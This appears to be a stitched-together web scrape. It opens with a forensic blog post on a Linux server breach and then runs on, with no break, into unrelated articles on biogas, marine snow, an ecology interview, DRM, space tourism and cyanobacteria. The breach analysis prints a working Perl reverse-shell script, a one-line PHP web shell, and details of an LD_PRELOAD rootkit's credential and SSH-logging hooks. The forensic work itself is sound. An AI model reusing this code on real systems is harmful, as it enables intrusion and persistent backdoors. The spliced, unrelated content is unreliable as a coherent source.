I had never heard of that library name before so I google .
Nothing comes up .
I check on another debian etch box I have for the output of ldd /usr / sbin / mysqld and no library / lib/ld- linuxv.so. 1 comes up .
I am definitely watching something that it should n’t be there .
And that ’s a rootkit !
I ask some friends online but nobody has ever faced that library rootkit before .
I try to find that file on the box but it ’s nowhere to be seen inside / lib / … the rootkit hides itself pretty well .
I ca n’t see it with ls / lib or echo / lib /*.
The rootkit has probably patched the kernel functions that allow me to see it .
Strangely though I was able to see it with ldd ( more about the technical stuff on the second half of the post ) .
I try to check on some other executables in / sbin with a for i in /usr / sbin /*; do ldd $ i ; done , all of them appear to have / lib/ld- linuxv.so. 1 as a library dependency .
I try to reboot the box with another kernel than the one it ’s currently using but I get strange errors that it ca n’t even find the hard disk .
I try to downgrade the “ working ” kernel in an attempt of booting the box cleanly without the rootkit .
I first take backups of the kernel and initramfs which are about to be replaced of course .
When apt - get procedure calls mkinitramfs in order to create the initramfs image I notice that there are errors saying that it can’t delete /tmp/mkinitramfs_UVWXYZ/lib/ld-linuxv.so.1 file , so rm fails and that makes mkinitramfs fail as well .
I decide that I am doing more harm than good to the machine at the time and that I should first get an image of the disk before I fiddle any more with it .
So I shut the box down .
I set up a new box with most of the services that should be running ( mail + dns ) , so I had the option to check on the disk with the rootkit on my own time .
Part 2 : Technical analysis
I . First look at the ld-linuxv.so.1 library
A couple of days later I put the disk to my box and made an image of each partition using dd :
dd if=/dev/sdb1 of=/mnt/image/part1 bs=64k
Then I could mount the image using loop to play with it :
mount -o loop / mnt / image / part1 /mnt/part1
A simple ls of / mnt / part1 / lib / revealed that ld- linuxv .so.1 was there .
I run strings to it :

As one can easily see there ’s some sort of password hash inside and references to /usr / sbin / sshd , / bin/sh and setting HISTFILE to / dev/null .
I took the disk image to my friend argp to help me figure out what exactly the rootkit does and how it was planted to the box .
II .
What the rootkit does
Initially , while casually discussing the incident , kargig and myself ( argp ) we thought that we had to do with a kernel rootkit .
However , after carefully studying the disassembled dead listing of ld-linuxv .so.1 , it became clear that it was a shared library based rootkit .
Specifically , the intruder created the /etc/ld.so. preload file on the system with just one entry ; the path of where he saved the ld-linuxv.so. 1 shared library , namely / lib/ld-linuxv.so.1 .
This has the effect of preloading ld-linuxv.so . 1 every single time a dynamically linked executable is run by a user .
Using the well - known technique of dlsym( RTLD_NEXT , symbol ) , in which the run-time address of the symbol after the current library is returned to allow the creation of wrappers , the ld-linuxv. so . 1 shared library trojans ( or hijacks ) several functions .
Below is a list of some of the functions the shared library hijacks and brief explanations of what some of them do :
crypt
readdir64
__xstat64
__l xstat64
opendir
login
pututline
open64
pam_open_session
pam_close_session
syslog
getspnam_r
getspnam
getpwnam
pam_authenticate
pam_get_item
__libc_start_main
read
write
accept
The hijacked accept ( ) function sends a reverse , i.e. outgoing , shell to the IP address that initiated the incoming connection at port 80 only if the incoming IP address is a specific one .
Afterwards it calls the original accept ( ) system call .
The hijacked getspnam ( ) function sets the encrypted password entry of the shadow password structure ( struct spwd -> sp_pwdp ) to a predefined hardcoded value ( “ $ 1$ UFJBmQyU$u2ULoQTJbwDvVA70ocLUI0 ” ) .
The hijacked read ( ) and write ( ) functions of the shared library wrap the corresponding system calls and if the current process is ssh ( client or daemon ) , their buffers are appended to the file / var / opt / _so_cache / lc for outgoing ssh connections , or to / var / opt / _so_cache / ld for incoming ones ( sshd ) .
These files are also kept hidden using the same approach as described above .
III .
How the rootkit was planted in the box
While argp was looking at the objdump output , I decided to take a look at the logs of the server .
The first place I looked was the apache2 logs .
Opening / mnt / part1/var/log/apache2/access.log.*
did n’t provide any outcome at first sight , nothing really striking out , but when I opened / mnt / part1/var/log/apache2/error.log.1
I faced these entries at the bottom :

So this was the entrance point .
Someone got through a web app to the box and was able to run code .
I downloaded “ foobar.ext ” from the same url and it was a perl script .
#!/usr/bin/perl
# Data Cha0s Perl Connect Back Backdoor Unpublished / Unreleased Source
# Code use Socket ; print “ [ *]
Dumping Arguments
” ; $ host = “ A.B.C.D ” ;
$ port = XYZ ; if ( $ ARGV [ 1 ] ) {
$ port = $ ARGV [ 1 ] ;
}
print “ [ *]
Connecting …
” ; $ proto = getprotobyname ( ‘ tcp ’ ) || die ( “ [ -]

” ) ; socket ( SERVER , PF_INET , SOCK_STREAM , $ proto ) || die ( “ [ -]

” ) ; my $ target = inet_aton ( $ host ) ; if ( ! connect ( SERVER , pack “ SnA4x8 ” , 2 , $ port , $ target ) ) {
die ( “ [ -]

” ) ;
}
print “ [ *]

” ; if ( ! fork ( ) ) {
open( STDIN , ” >&SERVER ” ) ;
open( STDOUT , ” >&SERVER ” ) ;
open( STDERR , ” >&SERVER ” ) ;
exec {‘/ bin/sh’} ‘- bash ’ . “ \0 ” x 4 ;
exit( 0 ) ;
}
Since I got the time when foobar.ext was downloaded I looked again at the apache2 access.log to see what was going on at the time .
Here are some entries :
A.B.C.D – – [ 15/Aug/2009:01:05:33 +0300 ]
“ GET http://www.domain.com/admin/

“ GET http://www.domain.com/images/imagedisplay.php
HTTP/1.1 ” 200 59 “ - ” “ Mozilla Firefox ”
The second entry , with the POST looks pretty strange .
I opened the admin / record_company .
php file and discovered that it is part of zen - cart .
The first result of googling for “ zencart record_company ” is this : Zen Cart ‘ record_company.php ’ Remote Code Execution Vulnerability .
So that ’s exactly how they were able to run code as the apach e2 user .
Opening images/imagedisplay .php shows the following code :
<?php system ($_SERVER [ " HTTP_SHELL " ] ) ; ?>
This code allows running commands using the account of the user running the apache2 server .
Part 3 : Conclusion and food for thought
To conclude on what happened :
1 ) The attacker used the zencart vulnerability to create the imagedisplay .
php file .
2 ) Using the imagedisplay .
php file he was able to make the server download foobar.ext from his server .
3 ) Using the imagedisplay .
php file he was able to run the server run foobar .
ext which is a reverse shell .
He could now connect to the machine .
4 ) Using some local exploit (s ) he was probably able to become root .
5 ) Since he was root he uploaded / compiled ld-linuxv.so.1 and he created /etc/ld.so.preload .
Now every executable would first load this “ trojaned ” library which allows him backdoor access to the box and is hidding from the system .
So there is his rootkit 🙂
Fortunately the rootkit had problems and if / var / opt / _so_cache / directory was not manually created it could n’t write the lc and ld files inside it .
If you created the _so_cache dir then it started logging .
If there are any more discoveries about the rootkit they will be posted in a new post .
If someone else wants to analyze the rootkit I would be more than happy if he / she put a link to the analysis as a comment on this blog .
Part 4 : Files
In the following tar .gz you will find the ld-linuxv . so.1 library and the perl script foobar .
ext ( Use at your own risk .
Attacker ’s host / ip have been removed from the perl script ) : linuxv-rootkit.tar.gz

Examined at a fundamental level , the universe seems to begin in lofty abstractions that lead to prosaic realities .
Thus mathematics encompasses physics , physics encompasses chemistry , chemistry encompasses biology , and it all leads to … well , us .
But then it gets very abstract again as we move from us to our very non-physical creations such as economics and government policy .
Maybe those abstractions get in our way sometimes .
Consider for example that millions , indeed billions , are being invested in ethanol production in the U.S. , and biodiesel is getting its fair share as well .
Apparently some of what ’s been driving the investment is those pesky abstractions , such as policy , and maybe even mere convention .
No doubt , ethanol and biodiesel both have their place .
My purpose is not to argue that there is no need to invest in these alternatives , but rather to suggest that if we think they are worth that much investment , we may want to take another look at biogas .
Consider the following data from a study by Roger Samson and his colleagues last year :
Just in case it ’s not clear from the chart , in terms of net energy output , biogas from corn silage in this study was shown to out - produce ethanol from corn by nearly 8 times .
One robin does not a spring make ?
This is only one study ?
Well consider a comprehensive , periodic study / report from the European Union ’s Joint Research Centre called “ Well to Wheels ” ( WTW ) , which examines 70 pathways from sunlight ( fuel source ) to vehicle road miles ( via different powertrain options ) , trying to put careful numbers under policy decisions taken in the EU .
The Biopact team at Mongabay.com reported on the 2006 version of this study , saying that :
“ Of all 70 possible fuel paths , the WTW - efficiency of compressed biogas used in a dedicated propulsion technology , is also ( far ) higher than classic biofuels ( ethanol , biodiesel ) , roughly equal to more advanced fuels ( synthetic diesel from biomass and biomethanol used in next - generation ICE ’s , biohydrogen in fuel cells ) , and almost as efficient as non-renewable advanced fuels ( syndiesel from coal - to - liquids and gas - to - liquids , and methanol used in advanced ICE’s ) . ”
Continuing the comparison with ethanol , Biopact reported that an earlier WTW study shows that the biogas from agricultural and municipal waste produces nearly four times the energy per unit of land as compared with corn-derived ethanol .
The environmental cost of this strong energy advantage was quite low .
According to the study , “ [ This WTW study ] now in fact shows that compressed biogas is the most climate friendly of more than 70 different … fuels and pathways … . ”
In other words biogas had the lowest greenhouse gas emissions of any option studied , although biodiesel was close .
( Ethanol , on average , was found to emit three times the GHG of biogas . )
There are other studies that come to much the same conclusion , which is that : biogas should be a leading candidate for helping the U.S. and the world gain energy independence .
Yet the policy - making machinery in the U.S. seems oblivious .
The US Department of Energy ’s World Biofuels Production Potential : Understanding the Challenges to Meeting the U.S. Renewable Fuel Standard ( September 2008 ) does not even mention biogas .
The National Biofuels Action Plan ( “ Leading the Federal Interagency Biomass Research and Development Initiative ” ; October 2008 ) does not mention biogas .
And Biomass Multi-Year Program Plan ( December 2009 ) ?
You guessed it … does not even mention biogas .
And DOE is very plain about it , saying “ DOE ’s Biomass Program is focusing on bioethanol and biodiesel production . ”
Why is that ?
This of course would be the place where I offer an incisive and remarkably sage analysis that will illuminate the history of this peculiar policy blind spot , but quite frankly , I do n’t know how it got burned into Washington ’s retina .
Maybe the corn lobby is stronger than the physics lobby ?
( Nah . Could n’t be . )
Perhaps it ’s because ethanol and biodiesel are liquid fuels , and as such we may , by mere convention , consider them better suited for powering our ugly , inefficient , lumbering ICE - powered vehicles .
Maybe so , but biomethane is essentially a one - for - one replacement of natural gas , and the process for converting vehicles to run on either CNG or LNG is well understood .
Worldwide , there are reported to be more than 7 million natural gas powered cars on the road .
Thus obviously , if the costs of conversion are roughly the same , and considering that we get rather more usable energy per unit land from biogas with far lower GHG as compared with other technologies , then the default choice would seem pretty clear .
It is true , of course that in spite of Swedish busses , trains ( and garbage trucks ) running on biogas ( indeed even a sailing cargo ship ) , because of the limitations on biomass availability — the same limits that ethanol and biodiesel face — biogas will not be a primary source of energy in society .
It should nevertheless be seen as a strong candidate when considering the conversion of available biomass into more portable forms of energy .
Indeed , even if , after rational consideration of all factors , ethanol or biodiesel ( for example ) are chosen as appropriate in a given circumstance , attention should be paid to the fact that biogas can be easily made from the by - products of either — left - over mash or biodiesel by - products — improving the result markedly .
( And that ’s a whole other column . )
In sum , we ought to keep trying to align our policies and economics with the applicable physics , because it will never happen the other way around .
Economics aligned with physics .
It ’s not very poetic , but in some senses , that ’s a fair definition of sustainability .
Eventually , surely , our human abstractions will also align with the intellectual realities of the universe , and create a better society for all of us , and healthier skies , seas and lands for all the other creatures voyaging with us around the sun .

VIDEO : Biological debris that falls from higher in the water column is also known as marine snow .
Some flakes fall for weeks before finally reaching the ocean floor .
As plants and animals near the surface of the ocean die and decay , they fall toward the seafloor , just like leaves and decaying material fall onto a forest floor .
In addition to dead animals and plants , marine snow also includes fecal matter , sand , soot , and other inorganic dust .
The decaying material is referred to as “ marine snow ” because it looks a little bit like white fluffy bits .
The “ snowflakes ” grow as they fall , some reaching several centimeters in diameter .
Some flakes fall for weeks before finally reaching the ocean floor .
This continuous rain of marine snow provides food for many deep - sea creatures .
Many animals in the dark parts of the ocean filter marine snow from the water or scavenge it from the seabed .
NOAA scientists and others have measured the amount of useable material in marine snow and found that there is plenty of carbon and nitrogen to feed many of the scavengers in the deep sea .

That is what you call a protocol , and selecting the right game protocol is a vital step in setting up your game ’s architecture .
Continuous Connection
This is one crucial element that should impact your decision on the protocol you choose for your game .
Continuous connection creates a tunnel of connection between two points that is constant throughout a session .
This is very important for MMOs , RPGs , multiplayer FPS , and RTS games .

John Bellamy Foster interviewed by Aleix Bombila
John Bellamy Foster is editor of the US socialist journal Monthly Review and author of Marx 's Ecology and The Ecological Revolution .
Aleix Bombila writes for En Lucha ( Spain ) .
This interview first appeared in English at MRZine .
En Lucha :
In your book Marx 's Ecology you argue that Marxism has a lot to offer to the ecologist movement .
What kind of united work can be established between Marxists and ecologists ?
John Bellamy Foster : I think it is important to recognise that Marxists and ecologists are not entirely different groups .
Of course it is true that there have been Reds who have been anti-ecological and Greens who have been anti-Marxist .
But it is not uncommon for the two to overlap , and increasingly to converge .
Many socialists are environmentalists and many environmentalists are socialists .
Indeed , there is a sense in which Marxism and ecology , both classically and today , lead to the same conclusion .
For Marx , the goal was the creation of a society in which the metabolic relation between humanity and nature ( i.e. production ) was rationally regulated by the associated producers .
The original title of my book that you refer to was supposed to be Marx and Ecology , but I changed it to Marx 's Ecology because of the depth of Marx 's ecological conceptions .
I would argue that a critical Marxist approach , especially in our time , requires an ecological worldview , while a critical human ecology requires an anti-capitalist and ultimately socialist orientation ( i.e. , a Marxist one ) .
In terms of united work that Marxists and ecologists can share , I would say social justice and environmental sustainability : saving humanity and saving the Earth .
You can't expect to achieve one without the other , and neither is possible under the existing system .
Probably the strongest single voice for an ecological relation in the world today is Evo Morales , the socialist ( and Indigenous ) president of Bolivia .
After the failed Copenhagen conference on climate change , Fidel Castro said that we used to think we were in a struggle simply to determine the society of the future , but we now know we are in a struggle for survival .
We have reached a point where historical materialists are taking global leadership in defining the ecological needs of humanity .
The struggle against climate change looks kind of abstract at first sight .
How can we organise campaigns against climate change with a real impact ?
Who should promote them ?
Climate change , and the planetary ecological crisis as a whole , which is much bigger , is the greatest material threat that civilisation , and indeed humanity , has ever confronted .
We are facing , if we do n't change course , the demise of the Earth as a habitable planet for most of today 's living species .
But , as you say , it seems abstract .
People can't feel it because it is not reflected consistently in the short - term weather conditions they experience on a daily or even a seasonal basis .
Moreover , it is not a problem that grows gradually and smoothly , but rather one that will accelerate with all sorts of tipping points , issuing in irreversible changes .
So time is extremely short , and it requires a certain degree of education as to what is happening .
Scientists are now almost unanimous on the threat , if not on all the details , but they do not have a direct line to the population .
There are very few actual authoritative global warming deniers and their scientific claims , such as they are , been refuted again and again , but because of the power of the capitalist class , which sees any action to avert the problem as a threat to its immediate interests , the denial view is constantly amplified in the corporate media .
Ordinary people are thus left uncertain as to what to think .
Besides , they are hit with other material problems that seem more immediate : economic stagnation , the current extreme downturn , and the destructive effects of neoliberal policy .
Workers are seeing their economic standard of living decline and are worried about their jobs ; increasing numbers are unemployed and in poverty .
So it is hard to concentrate on something as seemingly nebulous as climate change .
If we are looking for a massive revolt from below in this area I believe that it will emerge first not at the centre but at the periphery of the capitalist world .
Toynbee in his studies of history used to talk about an internal and an external proletariat .
On climate change , as well as in the revolts against capitalism in general , it is the external proletariat in the periphery of the capitalist world economy that will undoubtedly take the leading role .
I have pointed in recent writings to the possibility of what I have called an " environmental proletariat " -- for whom resistance to environmental conditions broadly , and not simply industrial conditions , is the defining struggle .
Those most oppressed in the world , who have nothing to lose , are to be found predominantly in third world regions .
So this is where the environmental proletariat also is mainly to be found .
This is especially evident in the effect that sea level rise will have on the Ganges - Brahmaputra Delta in Bangladesh and India and on the low - lying fertile areas of the Indian Ocean and China Sea -- Kerala in India , Thailand , Vietnam , Indonesia .
Some areas , like the low - lying delta of the Pearl River in China , correspond to the areas of fastest development ( in this case Guangdong industrial region from Shenzhen to Guangzhou ) , and some of the sharpest class contradictions .
So the world epicenters of environmental and class struggle may overlap .
There are all sorts of signs -- as in the water , hydrocarbon , and coca wars in Bolivia , which helped bring a socialist and Indigenous - based political movement to power -- that the material bases of social struggle is being transformed , raising issues that are more all - encompassing .
Even in the centre of the system ( the internal proletariat ) , there are a lot of ongoing struggles by environmentalists , and particularly the youth - based climate justice movement .
Although there is no sign of a revolt from below from workers at present , and even though the labour movement seems to be entirely dormant in the United States in particular in the context of worsening economic ( and environmental ) conditions , there is hope that community - based , labour - environmental struggles will generate a new context for change .
It is to be hoped that something like an environmental proletariat will eventually emerge in the centre too .
If one reads classic works like Engels 's The Condition of the Working Class in England one gets the sense in which environmental struggles were crucial to the making of the English working class in the classical era , in ways that belie a narrow productivist vision .
The truth is that when it comes to the dual contradictions represented by the economic and environmental failures of the system , it is only socialists that are able effectively to bring these issues together .
Only historical materialists fully embody a theory and a practice that recognises that these are not separate issues but have a common basis in the capitalist mode of production .
Indeed , I think we are increasingly seeing a convergence of socialist and ecological visions of the future , in a way that leads in a much more revolutionary direction than we have ever seen before .
But we should not be blindly optimistic .
This also requires organisation .
And there are great dangers , such as the growth of ecofascism , and the delaying tactics of those in power that could spell " the common ruin of the contending classes . "
How can we foster environmental justice without prejudicing the working class ?
One might as well ask :
How can we not foster environmental justice without prejudicing the working class ?
One of the first works on environmental justice , as I have already suggested , was Engels 's The Condition of the Working Class in England , which focused on how the working class was subject to toxic living conditions and the consequences in terms of health , looking at how this has affected class divisions and urban structure .
Such concerns were part of the working - class struggle in the beginning .
Environmental justice also includes health and safety within factories -- and in a broader sense than this is usually understood , encompassing such issues as length of working day , intensity of hours , etc .
It is only the growth of a business - oriented trade union movement , and its segmentation from other working - class issues under contemporary capitalist systems of legal / political regulation , that has allowed people to think that the labour movement in particular and class struggle in general centres on a very restrictive set of issues , separated from environmental justice , which is in reality the measure of how inequality affects people in the multiple material domains of life .
Of course environmental injustice in the United States is understandably seen as related to race perhaps even more than class , since its greatest impact is on those individuals and communities that are subject to environmental racism .
Toxic wastes , as is well known , are more commonly dumped in communities of colour .
One then sometimes runs into the misconception that this is a race and not a class issue for that very reason .
Often implicit in this is the false notion that the working class is white , and so , if the problem is one that primarily affects American Indians , blacks , Latinos , Asians , then it is not a class issue .
But of course the working class in the United States is predominantly made up of so - called " minority races " .
There is no sense in which the working class is a white working class , as is commonly supposed ( and as contemporary whiteness studies teach us the whole issue of " white " needs examination ) .
Environmental justice is thus a race and class ( and indeed a gender ) issue .
It raises issues that the contemporary labour movement , with its limited " bargaining " position and the racial divides that it has often helped perpetuate , is not very well equipped to deal with , but that a socialist working - class movement could much more easily address .
Are taxes on polluting industries a solution ?
If you mean an ultimate solution , the answer is No .
The only real solution is to get rid of capitalism and put an egalitarian , sustainable society , run by the associated producers , in its place .
But we have to face the fact that the environmental problem , including climate change , is accelerating , that this is a question of survival for humanity and most species on the earth .
The time in which to act if we want to avoid irreversible environmental decline is incredibly short , with only a generation or so in which to implement a drastic change of course .
That at least is what science is telling us at present .
Under these circumstances we need both short - term radical responses and a longer - term ecological revolution .
The first needs to help promote the conditions for the second .
The immediate , short - term response requires , I am convinced , a carbon tax of the kind proposed by James Hansen : a progressively increasing tax imposed at well head , mine shaft , or point of entry with 100 per cent of the revenue going back to the population on a monthly basis .
The point of this set - up , as Hansen says , is to make sure that the carbon tax is imposed as much as possible at the point of production and falls on those with the largest carbon footprints ( mostly the rich ) , with the majority of the population gaining from the distribution of the revenue from the tax , since they have less - than - average per-capita footprints .
Neither capital nor the governments controlled by capital would have their hands on the revenue , which would flow directly to the population .
Implementing this in the kind of society that we have would of course be difficult .
But once it was understood as having the effect of both protecting the earth ( by making the price of carbon higher ) and generally redistributing income toward those at the bottom of the society , it would gain strong popular support .
The truth is that as long as we are in a capitalist society a key means of controlling a pollutant -- and carbon dioxide has unfortunately become that -- is going to be increasing its price .
More direct political forms of regulation should of course be used as well .
For example , we need simply to ban the building of coal - fired plants as long as sequestration technology does n't exist ( and at present there are all sorts of obstacles ) , and existing coal - fired plants need to be rapidly phased out .
To accomplish this on the necessary scale , however , requires a general ecological revolution affecting what we produce and consume and how our society is organised .
Is a collective solution to the ecological crisis possible within this system ( renewable energies , improvement of public transport , cessation of big infrastructures , etc. ) ?
Again , there is no collective solution within the system .
But we can promote collective solutions from within the system , which , going against its logic , will play a part in the transition to another , people - controlled system .
The new society will emerge from the womb of the old .
Fred Magdoff and I have discussed the problem of capitalism and the environment in detail in an article that is appearing in the March 2010 issue of Monthly Review , entitled " What Every Environmentalist Needs to Know about Capitalism . "
The basic point , which needs elaboration of course , is the fact that the regime of capital is one of self - expanding value .
Capitalism requires for its very existence constant economic growth and , more explicitly , accumulation of capital .
Such a system can clearly be very effective up to a certain point in promoting production and economic development .
But it also is very exploitative and ultimately leads to the destruction of the environmental conditions of existence .
The only real social and ecological solution is a society not focused on accumulation or economic growth per se , but on sustainable human development .
No matter what measures you introduce to modernise capitalism ecologically , the system requires a constant growth of the treadmill of production .
If we substitute public for private transportation , introduce renewable energies , and adopt other collective measures , it can help .
But these themselves tend to be limited by the accumulation goal of the system .
Reliance on renewable resources , for example , is important .
But it requires a system that uses them only at the level at which they can be renewed .
Capital pushes beyond all such boundaries .
What this means is not that we back off from promoting more social , collective , public solutions .
But we need to recognise that going in that direction invariably means going against the logic of the system , so it requires radical organisation .
What we are talking about is trying to create , in part from within capitalism , the infrastructure for a different kind of society .
With constant pressure from below some things can be achieved , as long as they do n't impinge substantially on the accumulation drive of the system .
But if accumulation itself is threatened capital fights back , and small victories are likely to be reversed .
The only answer -- no longer to be seen simply as a question of justice but also one of survival -- is to push beyond what capital is willing to accept , i.e. , to promote human and collective needs beyond the so - called " market system " .
In that case , you are talking , if you take it far enough to make a real difference , about an ecological and social revolution and the transition to another kind of society .
Some social movements believe it is possible to live apart from capitalism .
Do you think this is possible , or does it just lead to the atomisation of the opposition ?
The US socialist Scott Nearing , who wrote a regular column for many years in Monthly Review , was one of the leaders of the self - sufficiency and back - to - the - land movement .
There is no doubt that this kind of separation of oneself from the main logic of the system and its effects ( a kind of living apart from the system ) constitutes a form of passive resistance ( still a form of resistance ) .
Throughout history human beings , faced by repressive systems , have returned to the land , and cultivated their own gardens , so to speak .
This can be a way of healing , regrouping , etc .
Many of those who have gone in this general direction have pioneered in alternative forms of agriculture , including organic farming , community - supported agriculture .
We should not underestimate the degree to which such actions can sometimes create alternatives crucial to the development of a new society , within the various interstices of the system .
But the real struggle to create a new society requires in addition an active resistance and political organisation : a direct revolt against the existing relations of production .
So the new strengths that were gained during a period of retreat have to become a part of an active resistance .
Complete withdrawal in a globalised capitalist system is largely an illusion .
It is interesting how Nearing himself combined his life of self - sufficiency with continual , active resistance .
He worked it from both ends .
Today we need people who are active in their resistance .
If they can combine this with various ways of freeing themselves from the rat race , so much the better .
The degrowth movement champions individual and collective initiatives in the search for alternatives to capitalism .
What is your opinion about it ?
How can we decrease globally within the capitalist system ?
Decrease globally within capitalism ?
We can't .
Capitalism is all about accumulation .
It is a grow - or - die system and on an increasingly global scale .
When economic growth , particularly the growth of profits , is not taking place , the system goes into a crisis , as at present .
This results in massive unemployment .
There are a lot of good things to be said about the " degrowth movement , " as articulated particularly in Paris in April 2008 .
But it is based on a voluntaristic approach to decrease consumption , and on the unreal assumption that you can have a stationary state ( that is a no - growth economy ) , as envisioned by John Stuart Mill in the 19th century , somehow in the context of the present system .
This is simply a misunderstanding as to the nature of capitalism .
As Joseph Schumpeter wrote , a no - growth capitalism is a contradictio in adjecto .
It is certainly true that we need a new economic structure focused on enough and not more .
An overall reduction in economic scale on the world level , particularly in the rich countries , could be accompanied by progress in sustainable human development , improving the real conditions of humanity by moving from possessive individualism to non-possessive humanism - collectivism .
But this would require a socialist economy to make it possible ( not inevitable ) .
If the alternative to capitalism is a democratically planned economy , how should this work so as to include environmental issues ?
I think we need to remember Marx 's warning in Capital about writing " recipes for the cook - shops of the future . "
It would be a mistake to try to write an actual blueprint for a socialist society , including one that incorporated environmental issues .
Yet , I think that Paul Burkett has demonstrated in a brilliant article on " Marx 's Vision of Sustainable Human Development " in the October 2005 issue of Monthly Review that Marx 's notion of communism was one of sustainable human development , and that it is indeed only in those terms that we can understand what Marx 's conception of a society of freely associated producers regulating their metabolism with nature was all about .
Hugo Chávez has defined the struggle for socialism in the 21st century in terms of " the elementary triangle of socialism " .
According to this view , derived from Marx , socialism consists of : ( 1 ) social ownership ; ( 2 ) social production organised by workers ; and ( 3 ) satisfaction of communal needs .
In my view , one can also speak of an " elementary triangle of ecology " , derived directly from Marx , which takes the struggle to a deeper level .
This can be defined as : ( 1 ) social use , not ownership , of nature ; ( 2 ) rational regulation by the associated producers of the metabolism between human beings and nature ; and ( 3 ) the satisfaction of communal needs -- not only of present but also future generations .
All of this is spelled out in detail at the end of the introduction to my book The Ecological Revolution , as well as in the final chapters of that book .
Finally , why should we read your last book , The Ecological Revolution ?
The opening words of the preface to The Ecological Revolution state : " My premise in this book is that we have reached a turning point in the human relation to the earth : all hope for the future of this relationship is now either revolutionary or it is false . "
The reason to read the Ecological Revolution is to begin to approach this question , which is now obviously the most important question facing humanity as we go forward into the future .
With companies like Ubisoft leading the way to a future where all PC games need to be in contact with their home servers all the time , one group is being particularly harmed by this movement : soldiers stationed in remote locations .
Life on deployment is hard , psychologically demanding , and often lonely for soldiers missing their loved ones and families .
Gaming is a popular pastime in American bases , but DRM can take that away .
He wanted to keep his name out of the story , but the description of his situation is one we 've heard from more than a few members of our armed forces who write to us about Internet connections as a vehicle for DRM .
" I 'm deployed to Iraq right now , and [ DRM ] has ranged from annoying to unforgivable for me .
I would like to let you know that Steam is pretty awesome with working with deployed folks to make sure we can access / play our games , " he told Ars .
" I 've had hit and miss success with some of the other download companies .
Any kind of game that tries to call home , though , is generally more of a problem than it is worth .
Especially ones that try to resolve your IP address with your version / purchase location . "
The issue is Internet connectivity .
" Net connectivity on some of the larger [ Forward Operating Bases ] — I'm on Victory Base , it 's HUGE and very built - up — is not terrible .
However , we all have severe bandwidth caps with the ' government sponsored Internet , ' drops in connectivity , or we have to pay a high price for ' civilian ' Internet , " he explained .
The price of his Internet connection ?
$ 150 a month for a 192 k connection .
He also points out that he does n't want to sound like he 's complaining about the situation .
" There are definitely guys out there who have it much worse . "
None of this is compatible with DRM that requires a constant connection
We get a lot of comments and e-mails about the threat this sort of DRM presents to our gaming troops .
In terms of numbers , it 's not like keeping the military from playing your games on base is going to hurt your bottom line in any major way , but when you 're selling single - player games like Assassin 's Creed 2 and forcing gamers to be connected at all times while playing , it effectively means that soldiers wo n't be able to play .
With flaky Internet connections or low bandwidth caps , a constant Internet connection is something of a luxury .
Soldiers are only one group where reliable , constant Internet connections are n't common ; those in rural areas or frequent travelers also find themselves with time to spend gaming but without a constant Internet connection .
This sort of DRM makes sense for a world where every device is always connected to some magically open and always - on Internet connection .
That world is a very long way away , so by requiring an Internet connection at all times to play a game that is n't online itself is simply alienating an audience .
This approach also represents a poor attempt to attack piracy by attacking people who want to pay you money for the game you 've made impossible for them to play .
The soldier who contacted us said that his base 's PX was pretty good about getting new games —
Mass Effect 2 just arrived — but when Assassin 's Creed 2 is released on the PC , it 's doubtful it will find an audience with soldiers who know they may not be able to play the game during their downtime .
Richard Garriott , the first video game designer to ride a rocket to outer space , wanted to play a massively multiplayer video game from the International Space Station .
And he wanted to bring his iPod.
Neither happened .

Garriott 's gaming plan was to play his then - still - active computer game Tabula Rasa from the International Space Station , logging onto a computer and playing with people down on Earth .
He traveled to the space station in 2008 as one of the world 's only self - funded space tourists .

" I looked into taking Tabula Rasa into space , " he told Kotaku during an interview at the DICE gaming summit just outside of Las Vegas last week .
" There 's Internet on the space station .
We actually originally were pursuing trying to play live , from space , but it turns out that even though there is an IP ( Internet protocol ) pathway , they were so worried about people tunneling backwards to the ISS and wreaking havoc that it became a non-starter . "
That 's right , gamers .
According to Garriott , the powers that be in some space agency thought that you would try to cheat your way into taking control of the space station .
We all know you 'd never do that .

Garriott 's a big iPhone gamer these days , but he did n't take that to space to idle the time away either .
" It turns out that to to take an iPhone to space or even an iPod is problematic , " he explained .
" They make you take the battery out and all kinds of crap .
It 's a pain in the ass . "
Note that the iPod has been to space .
Garriott filled in the details and revealed the spending limits of a man who will pay millions to fly to space on a Russian rocket : " Somebody had paid tens of thousands of dollars to get one of the oldest versions of the iPod [ certified ] to go into space .
If you took that one , you had to have the lithium battery pulled out , because , hypothetically , it 's a fire hazard — it 's not really ; it 's actually much worse after you crack the whole thing open , rip the battery out and put wires into it — but anyway , it costs you so much money to even take the iPod , it just was n't worth it . "
To bring a newer iPod would cost even more money , because the new device would need to be certified all over again , he said .

So the game designer who went to space took no video games with him .
This game designer has been on other adventures , too .
Recently , he appeared on the Martha Stewart show to display his collection of automatons .
He may have brought his iPhone with him there , but , at DICE , Garriott confirmed to Kotaku that he did n't play video games with Ms. Stewart .

( PhysOrg.com ) -- Reduce .
Reuse .
Recycle .
We hear this mantra time and again .
When it comes to carbon ‹the " Most Wanted " element in terms of climate change‹nature has got reuse and recycle covered .
However , it 's up to us to reduce .
Scientists at Harvard Medical School are trying to meet this challenge by learning more about the carbon cycle , that is , the process by which carbon moves from the atmosphere into plants , oceans , soils , the earth 's crust , and back into the atmosphere again .
One of the biggest movers and shakers is the lowly cyanobacteria , an ocean - dwelling , one - celled organism .
Pamela Silver , HMS professor of systems biology , and colleagues have uncovered details about how this bacteria fixes , or digests , carbon .
These bacteria build miniature factories inside themselves that turn carbon into fuel .
Silver and her colleagues report that the bacteria organize these factories spatially , revealing a structural sophistication not often seen in single - celled organisms .
This regular and predictable spacing improves the efficiency of carbon processing .
In the future , an understanding of the mechanisms that govern this spatial organization may help improve the efficiency of designer bacteria engineered to produce carbon - neutral fuels such as biodiesel and hydrogen .
These findings will be published online March 5 in the journal Science .
The rod -shaped cyanobacteria are among the most abundant organisms on earth .
Forty percent of the carbon in the carbon cycle is reused and recycled through these tiny creatures .
To process carbon , cyanobacteria build soccer - ball - shaped structures inside themselves called carboxysomes .
These tiny factories absorb carbon dioxide and convert it into sugar , which the bacteria then use to produce energy .
" The ocean is just packed with these bacteria .
By studying them , we 're understanding more about how the earth works , " said Silver , who is also on the faculty of the Wyss Institute for Biologically Inspired Engineering at HMS .
" I 'm blown away by what 's happening in the ocean and what we do n't understand about it .
There are a lot of things in the ocean that are going to be useful to us . "
The research team , led by co-first authors , research fellows David Savage and Bruno Afonso , attached a fluorescent tag to proteins involved in building the carboxysome , then grew the tagged bacteria under a microscope .
The resulting images revealed that , instead of being randomly numbered and haphazardly placed , cyanobacteria build carboxysomes in numbers that scale with their size , and they space the factories evenly along their length .

